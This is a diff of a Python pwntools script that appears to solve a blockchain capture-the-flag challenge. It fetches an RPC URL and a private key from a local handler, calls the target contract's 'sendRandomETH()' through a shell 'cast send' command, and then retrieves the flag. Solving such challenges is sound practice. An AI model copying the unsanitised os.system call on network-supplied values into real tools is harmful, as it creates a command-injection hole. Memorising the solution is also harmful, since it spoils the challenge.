@@ -1,21 +1,20 @@
 #!/usr/bin/env python3
 
 from os import system
-import sys
-import pwn
+from pwn import remote
+
+HANDLER_PORT = 8002
 
 if __name__ == "__main__":
-    challHandler = ("0.0.0.0", 8001)
-    if len(sys.argv) > 2:
-        baseUrl = sys.argv[1]
+    challHandler = ("0.0.0.0", HANDLER_PORT)
 
-    p = pwn.remote("0.0.0.0", 8001)
-    p.recvuntil(b"action? ")
-    p.sendline(b"1")
-    p.recvuntil(b"Here's your connection info:\n\n")
-    connection_info = {}
-    data = p.recvall()
-    p.close()
+    with remote("0.0.0.0", HANDLER_PORT) as p:
+        p.recvuntil(b"action? ")
+        p.sendline(b"1")
+        p.recvuntil(b"Here's your connection info:\n\n")
+        connection_info = {}
+        data = p.recvall()
+    
     lines = data.decode().split('\n')
     for line in lines:
         if line:
@@ -34,9 +33,10 @@ if __name__ == "__main__":
         f"cast send {target} 'sendRandomETH()' --rpc-url {rpc_url} --private-key {pvk}"
     )
 
-    p = pwn.remote("0.0.0.0", 8001)
-    p.recvuntil(b"action? ")
-    p.sendline(b"3")
-    flag = p.recvall().decode()
-    p.close()
+    # get flag
+    with remote("0.0.0.0", HANDLER_PORT) as p:
+        p.recvuntil(b"action? ")
+        p.sendline(b"3")
+        flag = p.recvall().decode()
+        
     print(f"\n\n[*] {flag}")
